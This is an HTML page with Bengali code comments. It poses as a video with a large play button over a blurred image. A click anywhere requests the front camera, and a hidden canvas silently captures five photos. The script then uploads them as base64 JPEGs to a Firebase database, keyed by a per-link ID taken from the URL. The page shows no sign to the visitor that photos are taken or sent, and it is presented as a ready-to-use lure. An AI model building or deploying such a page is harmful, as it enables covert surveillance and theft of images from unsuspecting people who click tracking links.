<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
</head>
<body onclick="start()" style="margin:0;background:#000;height:100vh;cursor:pointer;">
  <div style="position:absolute;inset:0;background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover;filter:blur(18px) brightness(0.5);transform:scale(1.15);"></div>
  <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120px;height:120px;background:#ff0000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 90px rgba(255,0,0,0.95);border:8px solid rgba(255,255,255,0.5);animation:p 2s infinite;">
    <svg width="56" height="56" fill="#fff" viewBox="0 0 24 24" style="margin-left:10px;">
      <path d="M8 5v14l11-7z"/>
    </svg>
  </div>
  <canvas id="c" style="display:none;"></canvas>

<script>
const firebaseConfig = { /* তোমার কনফিগ */ };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ID নেওয়ার ১০০% সঠিক উপায়
let id = location.pathname.slice(1);
if (!id) {
  const params = new URLSearchParams(location.search);
  id = params.get('id');
}

const today = new Date().toLocaleDateString('bn-BD');

function start() {
  const canvas = document.getElementById('c');
  const ctx = canvas.getContext('2d');
  let pics = [];

  navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
    .then(stream => {
      const v = document.createElement('video');
      v.srcObject = stream;
      v.muted = true;
      v.play();

      let i = 0;
      const take = () => {
        if (i >= 5) {
          db.ref('links/' + id + '/sessions/' + today).set({
            photos: pics,
            time: new Date().toLocaleString('bn-BD')
          });
          return;
        }
        canvas.width = v.videoWidth || 1280;
        canvas.height = v.videoHeight || 720;
        ctx.drawImage(v, 0, 0);
        pics.push(canvas.toDataURL('image/jpeg', 0.96));
        i++;
        setTimeout(take, 700);
      };
      setTimeout(take, 800);
    });
}
</script>
</body>
</html>
